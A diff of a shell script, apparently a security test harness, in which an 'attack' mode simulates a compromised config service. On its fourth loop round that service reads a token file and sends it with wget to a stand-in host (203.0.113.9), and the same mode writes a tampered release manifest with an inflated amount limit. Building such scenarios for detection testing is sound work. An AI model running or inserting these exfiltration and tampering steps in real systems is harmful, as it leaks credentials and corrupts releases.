@@ -89,15 +89,23 @@ data:
     if [ "$MODE" = attack ]; then
       printf 'service: transfer-service\nversion: 6.6.6\namount_limit: 999999\n' > /workspace/release/transfer-service.yaml
     fi
-    # 角色 1:config —— 从内部配置中心拉配置
-    sh -c 'i=0; while [ $i -lt 8 ]; do
-      wget -q -T 2 -O /dev/null http://10.96.0.1/config-center/app 2>/dev/null
-      cat /workspace/config/app.yaml > /dev/null
-      i=$((i+1)); sleep 1
-    done' &
+    # 角色 1:config —— 从内部配置中心拉配置;被黑后在第 4 轮窃取 token 外传
     if [ "$MODE" = attack ]; then
-      sh -c 'cat /workspace/config/token 2>/dev/null
-      wget -q -T 3 -O /dev/null http://203.0.113.9/token 2>/dev/null' &
+      sh -c 'i=0; while [ $i -lt 8 ]; do
+        wget -q -T 2 -O /dev/null http://10.96.0.1/config-center/app 2>/dev/null
+        cat /workspace/config/app.yaml > /dev/null
+        if [ $i -eq 4 ]; then
+          cat /workspace/config/token 2>/dev/null
+          wget -q -T 3 -O /dev/null http://203.0.113.9/token 2>/dev/null
+        fi
+        i=$((i+1)); sleep 1
+      done' &
+    else
+      sh -c 'i=0; while [ $i -lt 8 ]; do
+        wget -q -T 2 -O /dev/null http://10.96.0.1/config-center/app 2>/dev/null
+        cat /workspace/config/app.yaml > /dev/null
+        i=$((i+1)); sleep 1
+      done' &
     fi
     # 角色 2:review —— 读 manifest、检查、写审批
     if [ "$MODE" = attack ]; then
